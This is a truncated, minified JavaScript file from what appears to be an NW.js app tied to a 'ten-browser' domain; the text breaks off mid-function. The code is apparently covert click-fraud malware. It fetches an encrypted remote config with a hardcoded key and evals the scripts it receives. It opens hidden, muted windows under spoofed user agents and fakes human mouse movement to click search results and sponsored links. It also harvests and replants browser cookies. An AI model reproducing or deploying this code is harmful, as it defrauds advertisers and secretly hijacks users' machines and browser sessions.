! function() {
  var frisitor = {};
  global.ENV = "PRODUCTION", "PRODUCTION" == global.ENV ? (frisitor.sid = "edzBrIMoTKWO-Qi629NnIA", frisitor.mid = "G-MS75LQX0HE") : (frisitor.sid = "SisIja8BTdiho6qKabVEHQ", frisitor.mid = "G-GN5GL1C2SW");
  try {
    var geo = localStorage.getItem("geo") || null
  } catch (e) {}
  try {
    require("events").EventEmitter.defaultMaxListeners = 1 / 0
  } catch (e) {}
  var frdver = "1753",
    ajax = {
      get: function(e, t, o, r) {
        var n;
        if((n = new XMLHttpRequest).onreadystatechange = function() {
            4 == n.readyState && (200 == n.status ? null != t && t(n) : (reportPageView("error", "ajax.get", null), null != o && o(n)))
          }, n.open("GET", e, !0), r)
          for(h in r) n.setRequestHeader(h, r[h]);
        n.send()
      },
      head: function(e, t, o) {
        var r;
        (r = new XMLHttpRequest).onreadystatechange = function() {
          4 == r.readyState && (200 == r.status ? null != t && t(r) : (reportPageView("error", "ajax.head", null), null != o && o(r)))
        }, r.open("HEAD", e, !0), r.send()
      },
      post: function(e, t, o, r, n) {
        var i;
        if((i = new XMLHttpRequest).onreadystatechange = function() {
            4 == i.readyState && (200 == i.status ? null != t && t(i) : (reportPageView("error", "ajax.post", null), null != o && o(i)))
          }, i.open("POST", e, !0), i.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), r)
          for(h in r) i.setRequestHeader(h, r[h]);
        var a = null;
        if(n)
          for(c in a = "", n) a && (a += "&"), a += c + "=" + n[c];
        i.send(a)
      }
    };

  function defined(e) {
    return void 0 !== e
  }

  function randomize(e, t) {
    return Math.random() * (t - e + 1) + e
  }
  var isEncrypted = CryptoJS && JsonFormatter,
    NCL = null;
  try {
    ncl = function(c, e, u, d, a) {
      function f(e, t) {
        try {
          var o = o;
          return t && (o = t), 0 <= e.top && 0 <= e.left && e.bottom <= (o.defaultView.innerHeight || o.documentElement.clientHeight) && e.right <= (o.defaultView.innerWidth || o.documentElement.clientWidth)
        } catch (e) {
          return
        }
      }

      function p(e) {
        try {
          var t = (e = e).getBoundingClientRect(),
            o = {};
          for(o.top = t.top, o.bottom = t.bottom, o.left = t.left, o.right = t.right, o.height = t.height, o.width = t.width; e = e.ownerDocument.defaultView.frameElement;) {
            var r = e.getBoundingClientRect();
            o.top += r.top, o.bottom += r.top, o.left += r.left, o.right += r.left
          }
          return o
        } catch (e) {
          return null
        }
      }

      function r(e) {
        var t = t;
        e && (t = e);
        var o = {};
        return o.x = Math.floor(F(0, t.defaultView.innerWidth)), o.y = Math.floor(F(0, t.defaultView.innerHeight)), o
      }

      function l(e, t, o) {
        return function(e, t) {
          var o = 0,
            r = 15,
            n = 1,
            i = 15,
            a = {
              x: Math.abs(t.x - e.x),
              y: Math.abs(t.y - e.y)
            },
            l = t.x > e.x ? 1 : -1,
            s = t.y > e.y ? 1 : -1,
            c = {
              x: a.x,
              y: a.y
            },
            u = e,
            d = [],
            f = {
              x: e.x,
              y: e.y,
              ts: 0,
              mx: Math.floor(F(o, Math.abs(c.x) < r ? Math.abs(c.x) : r)),
              my: Math.floor(F(o, Math.abs(c.y) < r ? Math.abs(c.y) : r))
            };
          for(d.push(f); 0 != c.x || 0 != c.y;) {
            var p = 0;
            c.x && (p = Math.abs(c.x) < r ? Math.abs(c.x) : r);
            var m = 0;
            c.y && (m = Math.abs(c.y) < r ? Math.abs(c.y) : r);
            var h, w = Math.floor(F(o, p)),
              v = Math.floor(F(o, m));
            c.x -= w, c.y -= v, (h = {}).x = u.x + w * l, h.y = u.y + v * s, h.ts = F(n, i), h.mx = w * l, h.my = v * s, u.x = h.x, u.y = h.y, d.push(h)
          }
          return (h = {
            x: u.x,
            y: u.y
          }).ts = F(n, i), 0 < Math.abs(u.x - t.x) ? (h.mx = Math.abs(u.x - t.x), h.x = (h.mx + u.x) * l) : h.x = 0, 0 < Math.abs(u.y - t.y) ? (h.my = Math.abs(u.y - t.y), h.y = (h.my + u.y) * s) : h.y = 0, (h.x || h.y) && (h.mx = h.mx || 0, h.my = h.my || 0, d.push(h)), d
        }(m || r(u), {
          x: e,
          y: t
        })
      }

      function t(e) {
        var t = Math.floor(F(e.left + 1, e.right - 1)),
          o = Math.floor(F(e.top + 1, e.bottom - 1)),
          r = t + d.window.screenX,
          n = o + d.window.screenY,
          i = l(t, o);
        s(i, u, function() {
          d.mousedown(t, o, "left", r, n), "function" == typeof a && global.setTimeout(a, 100)
        })
      }
      var m = r(u) || null,
        s = function(e, t, o) {
          if(window.document, e.length) {
            var r = e.shift(),
              n = r.x + d.window.screenX,
              i = r.y + d.window.screenY;
            d.mousemove(r.x, r.y, r.mx, r.my, n, i), global.setTimeout(s, r.ts, e, t, o)
          } else o && o()
        };
      try {
        if(!d) throw "No WND Provided, Mandatory!";
        window.document;
        var o = p(c);
        if(!(o.top || o.left || o.right || o.bottom)) {
          if(!e) return !1;
          o = e
        }
        return !!((function(e) {
          try {
            return "none" != e.style.display && "hidden" != e.style.visibility
          } catch (e) {
            return
          }
        }(c) || e) && 0 < o.height && 0 < o.width && o.right < u.defaultView.innerWidth) && (f(o, u) ? t(o) : (function(e, t, o, r) {
          var n = {
              min: 50,
              max: 300
            },
            i = m.x + d.window.screenX,
            a = m.y + d.window.screenY;
          if(f(e, u)) r && r(e);
          else {
            for(var l = [], s = 0; s < t; s++) move = {
              ts: F(n.min, n.max),
              delta: 100 * o
            }, l.push(move);
            ! function e(t, o) {
              if(t.length) {
                var r = t.shift();
                d.mousewheel(m.x, m.y, 0, r.delta, i, a), global.setTimeout(e, r.ts, t, o)
              } else global.setTimeout(o, F(n.min, n.max))
            }(l, function() {
              if(r && "function" == typeof r) {
                var e = p(c);
                r(e)
              }
            })
          }
        }(o, Math.abs(Math.floor(o.top / 100)), Math.sign(o.top), t), !0))
      } catch (e) {
        return !1
      }
    }
  } catch (e) {
    ncl = null, reportPageView("error", "ncl", null)
  }

  function F(e, t) {
    return Math.random() * (t - e + 1) + e
  }
  var dbAPI = null;
  try {
    dbAPI = new Object, dbAPI.handle = openDatabase("cdb", "1.0", "Monster", 15728640), dbAPI.cookiePrototype = ["name", "value", "domain", "host_only", "path", "secure", "http_only", "same_site", "session", "expiration_date", "store_id"], dbAPI.store = function(s, c, t) {
      if(s && c.length) {
        Object.keys(c[0]);
        for(var u = "CREATE TABLE IF NOT EXISTS " + s + " (", e = 0; e < dbAPI.cookiePrototype.length; e++) u += dbAPI.cookiePrototype[e], e < dbAPI.cookiePrototype.length - 1 && (u += ", ");
        u += ")", dbAPI.handle.transaction(function(e) {
          e.executeSql("DROP TABLE IF EXISTS " + s), e.executeSql(u);
          for(var t = 0; t < c.length; t++) {
            for(var o = "INSERT INTO " + s + "(", r = "VALUES (", n = Object.keys(c[t]), a = 0; a < n.length; a++) o += n[a], r += "?", a < n.length - 1 && (o += ", ", r += ", ");
            o += ") ", r += ")";
            var l = [];
            for(i in c[t]) l.push(c[t][i]);
            e.executeSql(o + r, l)
          }
        }, function(e) {
          "function" == typeof t && t(!0)
        }, function() {
          "function" == typeof t && t()
        })
      }
    }, dbAPI.retrieve = function(t, n) {
      dbAPI.handle.transaction(function(e) {
        e.executeSql("SELECT * FROM " + t, [], function(e, t) {
          for(var o = [], r = 0; r < t.rows.length; r++) o.push(t.rows.item(r));
          "function" == typeof n && n(o)
        }, function(e) {
          "function" == typeof n && n(null, !0)
        })
      })
    }
  } catch (e) {}
  var CM = null;
  try {
    CM = function() {
      var r = global.chrome;
      if(!r) throw "Window Object Inaccessible";
      var o = ["facebook.com", "gmail.com", "google.com", "instagram.com", "youtube.com", "messenger.com", "whatsapp.com", "linkedin.com", "amazon.com"];

      function l(e) {
        for(var t = 0; t < o.length; t++)
          if(-1 != e.indexOf(o[t])) return 1
      }

      function n() {
        return JSON.parse(localStorage.getItem("cookieMonster")) || []
      }

      function i(e) {
        return "http" + ("boolean" == typeof e.secure && e.secure || "string" == typeof e.secure && "true" == e.secure ? "s" : "") + "://" + e.domain + e.path
      }

      function a(e, o) {
        var t = {};
        try {
          if("true" == e.session && "function" == typeof o) return void o({}, !1);
          t.url = i(e), t.name = e.name, t.value = e.value, t.secure = "true" == e.secure, t.httpOnly = "true" == e.http_only, t.expirationDate = parseInt(e.expiration_date), t.session = "true" == e.session
        } catch (e) {}
        r.cookies.set(t, function(e) {
          var t = !1;
          e ? e.name || (e = e[0]) : t = !0, "function" == typeof o && o(e, t)
        })
      }

      function s(e, o) {
        var t = i(e);
        r.cookies.remove({
          url: t,
          name: e.name
        }, function(e) {
          var t = !1;
          e ? e.name || (e = e[0]) : t = !0, "function" == typeof o && o(e, t)
        })
      }
      try {
        var e = {};
        return e.chrome = r, e.cookieMap = n, e.setCookie = a, e.removeCookie = s, e.getCurrentSession = function(o) {
          try {
            r.cookies.getAll({}, function(e) {
              try {
                var t = e;
                void 0 === e && (t = new Object), "function" == typeof o && o(t)
              } catch (e) {
                "function" == typeof o && o(null)
              }
            })
          } catch (e) {
            "function" == typeof o && o(null)
          }
        }, e.clearCurrentSession = function(e, o) {
          try {
            for(var r = e.length, n = 0, i = [], a = global.setTimeout(function() {
                "function" == typeof o && o(null)
              }, 15e3), t = 0; t < e.length; t++) i.push(e[t]), l(e[t].domain) ? ++n == r && "function" == typeof o && (global.clearTimeout(a), o(i)) : s(e[t], function(e, t) {
              try {
                if(t) throw "Remove Cookie Error";
                ++n == r && "function" == typeof o && (global.clearTimeout(a), o(i))
              } catch (e) {
                "function" == typeof o && (global.clearTimeout(a), o(null))
              }
            });
            r || "function" == typeof o && (global.clearTimeout(a), o(i))
          } catch (e) {
            "function" == typeof o && (global.clearTimeout(a), o(null))
          }
        }, e.setCurrentSession = function(e, o) {
          for(var r = e.length, n = 0, t = 0; t < e.length; t++) a(e[t], function(e, t) {
            ++n == r && "function" == typeof o && o()
          });
          e.length || "function" == typeof o && o()
        }, e.saveSession = function(e, t, o) {
          try {
            var r = n(); - 1 == r.indexOf(e) && r.push(e), localStorage.setItem("cookieMonster", JSON.stringify(r)), dbAPI.store(e, t, o)
          } catch (e) {
            "function" == typeof o && o(!0)
          }
        }, e.loadSession = function(e, o) {
          -1 == n().indexOf(e) ? "function" == typeof o && o(session, !0) : dbAPI.retrieve(e, function(e, t) {
            "function" == typeof o && o(e, t)
          })
        }, e.deleteSession = function(e) {
          var t = n().indexOf(e);
          if(-1 == t) 0;
          else {
            var o = n();
            o.splice(t, 1), localStorage.setItem("cookieMonster", JSON.stringify(o))
          }
        }, e.clearCookies = function() {
          try {
            r.cookies.getAll({}, function(e) {
              try {
                for(var t = 0; t < e.length; t++) try {
                  s(e[t], function(e, t) {})
                } catch (e) {
                  reportPageView("error", "clearCookiesRemove", null)
                }
              } catch (e) {
                reportPageView("error", "clearCookiesGetAll", null)
              }
            })
          } catch (e) {
            reportPageView("error", "clearCookies", null)
          }
        }, e
      } catch (e) {
        return null
      }
    }()
  } catch (e) {
    CM = null, reportPageView("error", "cookies", null)
  }
  var maxHeapSize = 1e3;

  function proximity() {
    try {
      return "DIRECT" !== nw.App.getProxyForURL("http://www.google.com")
    } catch (e) {
      return !0
    }
  }

  function getStorage() {
    try {
      var e = localStorage.getItem("FRDT");
      return e || null
    } catch (e) {
      return reportPageView("error", "fileStorage", null), null
    }
  }

  function setTimeSpace(e) {
    var t = e,
      o = JSON.parse(localStorage.getItem("FRDO"));
    if(o && o.ds && getDatedFormat(new Date) == o.ds && o.freq && o.freq.min && o.freq.max) t = o.freq;
    else {
      var r = generateBucketSpace();
      r && r.freq && r.freq.min && r.freq.max && (t = r.freq)
    }
    var n = function(e) {
      try {
        var t = window.kwl.freq.min,
          o = window.kwl.freq.max;
        e && (t = e.min, o = e.max);
        var r = randomize(t, o);
        return (new Date).getTime() + r
      } catch (e) {
        return reportPageView("error", "frdtime", null), null
      }
    }(t);
    return localStorage.setItem("FRDT", n), n
  }

  function getDatedFormat(e) {
    return e.getFullYear().toString() + (e.getMonth() + 1).toString() + e.getDate().toString()
  }

  function generateBucketSpace() {
    try {
      var e = randomize(1, 1e3),
        t = kwl.bucketFreq,
        o = 0,
        r = null;
      if(t)
        for(b in t) {
          if(o < e && e <= 10 * t[b] + o) {
            r = parseInt(b);
            break
          }
          o += 10 * t[b]
        }
      if(r) {
        var n = {};
        return n.ds = getDatedFormat(new Date), n.freq = kwl.freq, n.freq.min = 24 / (r + 1) * 60 * 60 * 1e3 + 1, n.freq.max = Math.min(24 / r * 60 * 60 * 1e3, kwl.freq.max), localStorage.setItem("FRDO", JSON.stringify(n)), n || null
      }
      return null
    } catch (e) {
      return null
    }
  }

  function reportEvent(t, e, o, r, n) {
    var i = i;
    defined(n) && (i = n), i.event(t, e, o, r, function(e) {
      e && i.event("reportingError", t, r)
    }).send()
  }

  function reportPageView(e, t, o) {
    try {
      fetch("https://www.google-analytics.com/mp/collect?measurement_id=" + frisitor.mid + "&api_secret=" + frisitor.sid, {
        method: "POST",
        body: JSON.stringify({
          client_id: report.cid,
          events: [{
            name: e,
            params: {
              app: nw.App.manifest.name,
              version: bVersion,
              srcid: report.srcid,
              uid: report.cid,
              data: t,
              prov: o,
              geo: geo
            }
          }]
        })
      })
    } catch (e) {}
  }

  function ping() {
    var i = getStorage();
    if((new Date).getTime() > i)
      if(proximity()) global.setTimeout(ping, 18e5);
      else {
        var e = null;
        e = isEncrypted ? {
          "xfv-id": !0
        } : {
          "xfv-ne": !0
        }, ajax.get("https://r.ten-browser.com/ten/ping", function(e) {
          var t = e.responseText;
          if(isEncrypted) try {
            var o = CryptoJS.AES.decrypt(e.responseText, "lio!mynameislio!!nothavi!youdicks", {
              format: JsonFormatter
            });
            t = CryptoJS.enc.Utf8.stringify(o)
          } catch (e) {
            return global.setTimeout(ping, 6e4), isEncrypted = !1, void reportPageView("error", "encryption", null)
          }
          window.kwl = JSON.parse(t);
          var r = 0;
          if(r = i ? setTimeSpace() : setTimeSpace(kwl.initFreq), global.setTimeout(ping, r - (new Date).getTime()), i) try {
            var n = randomize(kwl.delayFreq.min, kwl.delayFreq.max);
            global.setTimeout(rocknroll, n)
          } catch (e) {}
        }, function(e) {
          global.setTimeout(ping, 6e5)
        }, e)
      }
    else global.setTimeout(ping, i - (new Date).getTime())
  }
  try {
    ping()
  } catch (e) {
    reportPageView("error", "ping", null), global.setTimeout(ping, 18e5)
  }

  function rocknroll() {
    var appver = bVersion || "0.0.0",
      guid = report.uid || "Missing GUID";
    try {
      var DID = report.uid || null,
        DIDActive = report.activated || null
    } catch (e) {}
    try {
      var localGeo = localStorage.getItem("localGeo") || null;
      localGeo || ajax.get("https://us-central1-geoip-249408.cloudfunctions.net/geolocation", function(e) {
        try {
          localGeo = JSON.parse(e.responseText).country, localStorage.setItem("localGeo", localGeo), ajax.get("https://dtools.fourtiz.com/whatismylocation/", function(e) {
            try {
              var t = JSON.parse(e.responseText).countryCode;
              t != localGeo ? reportPageView("geo", "mismatch", localGeo + "." + t) : reportPageView("geo", "match", localGeo)
            } catch (e) {}
          }, function(e) {})
        } catch (e) {}
      }, function(e) {})
    } catch (e) {}
    var appVerSC = bVersion;
    try {
      var appVerSC = bVersion + "." + report.srcid
    } catch (e) {
      appVerSC = bVersion, reportPageView("error", "subchannel", null)
    }
    try {
      report.event("saint_frida"), reportPageView("session", "subchannel", null)
    } catch (e) {}
    try {
      DID && report.alive()
    } catch (e) {}

    function userAgent() {
      var e = "",
        t = JSON.parse(localStorage.getItem("ua")) || null;
      if(t && t.default && t.default.string && t.default.browser) {
        var o = !1;
        if(0 == t.index && kwl.ua.browsers[t.browser][t.header][0].replace("%OS%", "%osinfo") != t.string) {
          o = !0, t.string = kwl.ua.browsers[t.browser][t.header][0].replace("%OS%", "%osinfo"), e = t.string;
          var r = "edge" == t.header ? "edge" : t.browser;
          t.version = kwl.ua.helper[r][t.index];
          t.version;
          report.event("ua.update", r, t.version)
        }
        o && localStorage.setItem("ua", JSON.stringify(t)), e = t.string;
        r = "edge" == t.header ? "edge" : t.browser;
        void 0 === t.version && (t.version = kwl.ua.helper[r][t.index], localStorage.setItem("ua", JSON.stringify(t))), report.event("ua", r, t.version)
      } else e = function(e) {
        var t = "",
          o = "headers",
          r = !1,
          n = e ? function(e, t) {
            for(b in e) e[b].chance = t[b];
            return e
          }(kwl.ua.browsers, e) : kwl.ua.browsers,
          i = Math.floor(randomize(1, 100)),
          a = 0,
          l = "chrome";
        if(n)
          for(b in n) {
            if(a < i && i <= n[b].chance + a) {
              l = b;
              break
            }
            a += n[b].chance
          }
        "explorer" == l && -1 != navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")).indexOf("Windows NT 10") && (o = "edge", r = !0);
        var s = kwl.ua.versioning,
          c = 0;
        if(a = 0, i = Math.floor(randomize(1, 100)), s)
          for(v = 0; v < s.length; v++) {
            if(a < i && i <= s[v] + a) {
              c = v;
              break
            }
            a += s[v]
          }
        for(; !n[l][o][c];) c--;
        var u = r ? "edge" : l,
          d = kwl.ua.helper[u][c];
        t = (t = n[l][o][c]).replace("%OS%", "%osinfo");
        var f = JSON.parse(localStorage.getItem("ua")) || {};
        return (f = {}).header = o, f.browser = l, f.version = d, f.index = c, f.string = t, localStorage.setItem("ua", JSON.stringify(f)), report.event("ua.set", u, d), t
      }();
      return e
    }
    var fPtr = 0,
      phaser = 2,
      oldLoc = null,
      isResAvailable = !1,
      SEOCompatible = !!bVersion && isNewerVersion("7.0.0", bVersion),
      UACompatible = SEOCompatible,
      NCLCompatible = !(!bVersion || !ncl) && isNewerVersion("11.0.0", bVersion),
      BOCompatible = !!bVersion && isNewerVersion("12.0.0", bVersion),
      isCookified = function() {
        return -1 != CM.cookieMap().indexOf("root")
      };
    try {
      void 0 !== kwl.globalCookieResetRate && kwl.globalCookieResetRate >= Math.floor(randomize(1, 100)) && (CM.clearCookies(), reportPageView("checkpoint", "clearCookies", null))
    } catch (e) {
      reportPageView("error", "clearCookiesCall", null)
    }
    var alreadyRan = !1,
      oddType = null,
      prov = kwl.prov;
    try {
      kwl.extendedProvs && kwl.extendedProvs.length && (prov = prov.concat(kwl.extendedProvs))
    } catch (e) {
      reportPageView("error", "extendedprovs", null), prov = kwl.prov
    }
    var maxPtr = prov.length + (kwl.seo && SEOCompatible ? 1 : 0),
      ua;
    try {
      for(var lastFlow = localStorage.getItem("lastFlower"), lastFlowStruct = JSON.parse(localStorage.getItem("flowers")), isCFGChanged = !1, flowStruct = new Array, p = 0; p < prov.length; p++) lastFlowStruct && lastFlowStruct.length && lastFlowStruct.length == prov.length && p == lastFlowStruct.indexOf(prov[p].id) || (isCFGChanged = !0), flowStruct.push(prov[p].id);
      if(isCFGChanged) localStorage.setItem("flowers", JSON.stringify(flowStruct));
      else if(0 < flowStruct.indexOf(lastFlow)) {
        var transition = prov.splice(flowStruct.indexOf(lastFlow) + 1, prov.length - flowStruct.indexOf(lastFlow));
        prov = transition.concat(prov)
      }
    } catch (e) {
      reportPageView("error", "persistence", null)
    }
    try {
      var isActivated = localStorage.getItem("ua") || null;
      if(!isActivated) {
        var aSCMajor = report.srcid || "organic",
          activationStr = "activation/" + bVersion + "/" + aSCMajor + "/" + guid;
        report.event("activation")
      }
    } catch (e) {
      reportPageView("error", "activation", null)
    }
    try {
      ua = userAgent()
    } catch (e) {
      reportPageView("error", "useragent", null), ua = navigator.userAgent, report.event("ua", "chrome", "default")
    }

    function generateKw() {
      var e = prov[fPtr].odds || function() {
        try {
          var e = {};
          for(o in kwl.kws) e[o] = kwl.kws[o].weight;
          return e
        } catch (e) {
          return reportPageView("error", "fallbackodds", null), null
        }
      }();
      if(!e) return null;
      var o = Object.keys(e)[0],
        r = 0,
        n = Math.floor(randomize(1, 1e4));
      if(e)
        for(t in e) {
          var i = 100 * e[t];
          if(r < n && n <= i + r) {
            o = t;
            break
          }
          r += i
        }
      oddType = o;
      var a = kwl.kws[o].kwa[Math.floor(randomize(0, kwl.kws[t].kwa.length - 1))];
      return reportPageView("kw", o + "." + a, prov[fPtr].id), a
    }

    function advance(t) {
      ! function() {
        isResAvailable = !1, phaser = 2, fPtr++;
        var e = 0;
        alreadyRan && kwl.spaceFreq && kwl.spaceFreq.min && kwl.spaceFreq.max && !t && 0 < fPtr && (e = randomize(kwl.spaceFreq.min, kwl.spaceFreq.max));
        if(fPtr < prov.length) {
          if("seo" == prov[fPtr].id) return global.setTimeout(advance, 0);
          global.setTimeout(instance, e)
        } else {
          if(maxPtr <= fPtr) return;
          kwl.seo && global.setTimeout(seo, e)
        }
      }()
    }

    function scramble(e) {
      String.prototype.replaceAt = function(e, t) {
        return this.substr(0, e) + t + this.substr(e + t.length)
      };
      var t = Math.floor(randomize(0, e.length - 2)),
        o = e[t];
      return e = (e = e.replaceAt(t, e[t + 1])).replaceAt(t + 1, o)
    }

    function garbage(e) {
      try {
        defined(gc) && e < 5 && (gc(), global.setTimeout(garbage, 1e3, e + 1))
      } catch (e) {
        reportPageView("error", "garbagecleaner", null)
      }
    }

    function instance() {
      var options = {
          frame: !0,
          width: screen.availWidth,
          height: screen.availHeight,
          position: "center",
          show: !1,
          focus: !1,
          always_on_top: !1,
          mute: !0,
          downloadable: !1,
          plugins: !1,
          alerts: !1,
          nwpolicy: "block",
          user_agent: ua
        },
        smoothWnd = null,
        strongLock = !1,
        actionTime = null,
        roamFallback = null,
        fallbackTime = 3,
        roamingFallbackUrl = null,
        NCLFactor = !0,
        isNCL = function() {
          return NCLCompatible && smoothWnd.mousedown && smoothWnd.mousewheel && smoothWnd.mousemove && prov[fPtr].ncl && NCLFactor
        },
        isFlowCookiefied = CM && (-1 != CM.cookieMap().indexOf(prov[fPtr].id) || -1 != !CM.cookieMap().indexOf(prov[fPtr].id) && prov[fPtr].cookieRate >= Math.floor(randomize(1, 100))),
        uaOverride = null,
        wndOverrideFlags = null;
      localStorage.setItem("lastFlower", prov[fPtr].id);
      var isFollowOn = !1,
        didFollowOn = !1,
        isPrivacyReported = !1,
        isNCLDone = !1,
        pseudoNavDetectPtr = null,
        isCookieResetTimeout = !1;

      function getUserAgent(e) {
        try {
          var t = "headers",
            o = !1;
          if("explorer" == e) - 1 != navigator.userAgent.substring(navigator.userAgent.indexOf("(") + 1, navigator.userAgent.indexOf(")")).indexOf("Windows NT 10") && (t = "edge", o = !0);
          var r = kwl.ua.browsers,
            n = o ? "edge" : e,
            i = kwl.ua.helper[n][0];
          return {
            ua: r[e][t][0].replace("%OS%", "%osinfo"),
            uaVer: i
          }
        } catch (e) {
          return reportPageView("error", "uaOverride", prov[fPtr].id), null
        }
      }

      function overrides(e) {
        e.Notification = smoothWnd.window.Function("return false;")
      }

      function isRendered(e, t) {
        try {
          var o = smoothWnd.window.document;
          if(t && (o = t), 1 != e.nodeType || e == o.body) return !0;
          if(e.currentStyle && "none" != e.currentStyle.display && "hidden" != e.currentStyle.visibility) return isRendered(e.parentNode, t);
          if(window.getComputedStyle) {
            var r = o.defaultView.getComputedStyle(e, null);
            if("none" != r.getPropertyValue("display") && "hidden" != r.getPropertyValue("visibility")) return isRendered(e.parentNode, t)
          }
          return !1
        } catch (e) {
          return reportPageView("error", "isrendered", prov[fPtr].id), !1
        }
      }

      function smoothTouch(e, t, o) {
        try {
          e && (isNCL() || isRendered(e, smoothWnd.window.document)) ? (isResAvailable = !0, smoothWnd.setNWPolicy("override"), isNCL() ? ncl(e, t, smoothWnd.window.document, smoothWnd, o) : (e.click(), smoothWnd.setNWPolicy("block"), "function" == typeof o && o()), isFollowOn = isFollowOn && !(didFollowOn = !0)) : smoothWnd.close()
        } catch (e) {
          reportPageView("error", "smoothTouch", prov[fPtr].id), smoothWnd.close()
        }
      }

      function touchRes(e, t, o) {
        try {
          function r(e) {
            isResAvailable = !0, e.setAttribute("target", "_self"), e.ownerDocument.defaultView != smoothWnd.window && e.setAttribute("target", "_top"), isNCL() ? ncl(e, t, smoothWnd.window.document, smoothWnd, o) : (e.click(), "function" == typeof o && o())
          }
          e && (isNCL() || isRendered(e, smoothWnd.window.document)) ? r(e) : smoothWnd.close()
        } catch (e) {
          reportPageView("error", "touchres", prov[fPtr].id), smoothWnd.close()
        }
      }

      function genRes() {
        for(var e = 0, t = Math.floor(randomize(1, 100)), o = 0, r = 0; r < kwl.res.length; r++) {
          if(e < t && t <= kwl.res[r] + e) {
            o = r;
            break
          }
          e += kwl.res[r]
        }
        return o
      }

      function followRock(step) {
        function followStepUp() {
          global.setTimeout(followRock, 1500, 2)
        }

        function doFollow() {
          if(!isNCL()) return reportPageView("error", "followOnNoNCL", prov[fPtr].id), void resRock();
          ! function(e) {
            try {
              return "none" == e.style.display ? !1 : "hidden" != e.style.visibility
            } catch (e) {
              return !1
            }
          }(a) || (rect = function(e) {
            try {
              var t = (e = e).getBoundingClientRect(),
                o = {};
              for(o.top = t.top, o.bottom = t.bottom, o.left = t.left, o.right = t.right, o.height = t.height, o.width = t.width; e = e.ownerDocument.defaultView.frameElement;) {
                var r = e.getBoundingClientRect();
                o.top += r.top, o.bottom += r.top, o.left += r.left, o.right += r.left
              }
              return o
            } catch (e) {
              return null
            }
          }(a))
        }
        var flowScr = prov[fPtr].followOn;
        try {
          eval("var flow =  " + flowScr)
        } catch (e) {
          reportPageView("error", "followonEval", prov[fPtr].id), smoothWnd.close()
        }
        try {
          if(flowOutput = flow(smoothWnd.window.document), "undefined" == typeof flowOutput || !flowOutput || 1 == step && (void 0 === flowOutput.res || !flowOutput.res.length)) return void resRock();
          var a = flowOutput.res[0],
            rect = null,
            dynamicTouch = BOCompatible && smoothWnd.setNWPolicy ? smoothTouch : touchRes;
          if(1 == step) {
            if(flowOutput.res && flowOutput.res.length && flowOutput.res[0]) {
              a = flowOutput.res[0], doFollow();
              var delayTime = 1e3 * randomize(4, 10);
              actionTime = global.setTimeout(dynamicTouch, delayTime, a, rect, followStepUp)
            }
          } else {
            if(2 != step) return reportPageView("error", "followOn", prov[fPtr].id), void resRock();
            if(!flowOutput.spo || !flowOutput.spo.length) return reportPageView("followOn", "noSuggestions", prov[fPtr].id), void resRock();
            a = flowOutput.spo[0];
            var res = genRes();
            if(res < 0 || "number" != typeof res) return void smoothWnd.close();
            for(; !flowOutput.spo[res] && 0 < res;) res--;
            if(!flowOutput.spo[res]) throw "followOn Results Error";
            a = flowOutput.spo[res], doFollow();
            var delayTime = 1e3 * randomize(4, 10);
            phaser--, actionTime = global.setTimeout(dynamicTouch, delayTime, a, rect, pseudoNavDetectPtr)
          }
        } catch (e) {
          return reportPageView("error", "followOn", prov[fPtr].id), void resRock()
        }
      }

      function privacyRock() {
        try {
          var flowScr = prov[fPtr].privacy;
          try {
            eval("var flow =  " + flowScr)
          } catch (e) {
            reportPageView("error", "privacyEval", prov[fPtr].id), smoothWnd.close()
          }
          flowOutput = flow(smoothWnd.window.document);
          var delayTime = 0;
          if("undefined" != typeof flowOutput && flowOutput && flowOutput.res && flowOutput.res.length && flowOutput.res[0]) {
            isPrivacyReported || (reportPageView("privacy", "impression", prov[fPtr].id), isPrivacyReported = !0);
            var a = flowOutput.res[0],
              rect = null,
              dynamicTouch = BOCompatible && smoothWnd.setNWPolicy ? smoothTouch : touchRes,
              rect = null;
            if(isNCL()) {
              function calculateDims(e) {
                try {
                  var t = (e = e).getBoundingClientRect(),
                    o = {};
                  for(o.top = t.top, o.bottom = t.bottom, o.left = t.left, o.right = t.right, o.height = t.height, o.width = t.width; e = e.ownerDocument.defaultView.frameElement;) {
                    var r = e.getBoundingClientRect();
                    o.top += r.top, o.bottom += r.top, o.left += r.left, o.right += r.left
                  }
                  return o
                } catch (e) {
                  return null
                }
              }
              var isVisible = function(e, t) {
                try {
                  return "none" == e.style.display ? !1 : "hidden" != e.style.visibility
                } catch (e) {
                  return !1
                }
              };
              isVisible(a) && (rect = calculateDims(a))
            } else NCLCompatible && NCLFactor && reportPageView("error", "ncl", prov[fPtr].id);
            var dynamicTouch = BOCompatible && smoothWnd.setNWPolicy ? smoothTouch : touchRes;
            delayTime = 1e3 * randomize(4, 10), actionTime = global.setTimeout(dynamicTouch, delayTime, a, rect, progressPhaser)
          } else progressPhaser();

          function progressPhaser() {
            try {
              NCLCompatible && prov[fPtr].followRate && "number" == typeof prov[fPtr].followRate && !isFollowOn && !didFollowOn && 100 * prov[fPtr].followRate > Math.floor(randomize(1, 1e4)) ? (isFollowOn = !0, followRock(1)) : resRock()
            } catch (e) {
              isFollowOn = !1
            }
          }
        } catch (e) {
          return reportPageView("error", "privacy", prov[fPtr].id), void resRock()
        }
      }

      function resRock() {
        var flowScr = prov[fPtr].results;
        isResAvailable = !1;
        var flowOutput = null;
        try {
          eval("var flow =  " + flowScr)
        } catch (e) {
          reportPageView("error", "flow", prov[fPtr].id), smoothWnd.close()
        }
        if(flowOutput = flow(smoothWnd.window.document), void 0 !== flowOutput && flowOutput) {
          var resType = flowOutput.res,
            spoProb = kwl.spo;
          if(void 0 !== prov[fPtr].spo && (spoProb = prov[fPtr].spo), void 0 !== prov[fPtr].oddSpo && void 0 !== prov[fPtr].oddSpo[oddType] && (spoProb = prov[fPtr].oddSpo[oddType]), spoProb && void 0 !== flowOutput.spo && 0 < flowOutput.spo.length) {
            var percisionFactor = 100;
            spoProb * percisionFactor > Math.floor(randomize(1, 100 * percisionFactor)) && (resType = flowOutput.spo)
          }
          if(void 0 !== resType && resType && resType.length) {
            var res = genRes();
            if(res < 0 || "number" != typeof res) smoothWnd.close();
            else {
              for(; !resType[res] && 0 < res;) res--;
              if(resType[res]) {
                var anchs = null,
                  a = resType[res];
                prov[fPtr].aFlow || (anchs = resType[res].getElementsByTagName("a"), 0 < anchs.length && (a = anchs.item(0)));
                var rect = null;
                if(isNCL()) {
                  function calculateDims(e) {
                    try {
                      var t = (e = e).getBoundingClientRect(),
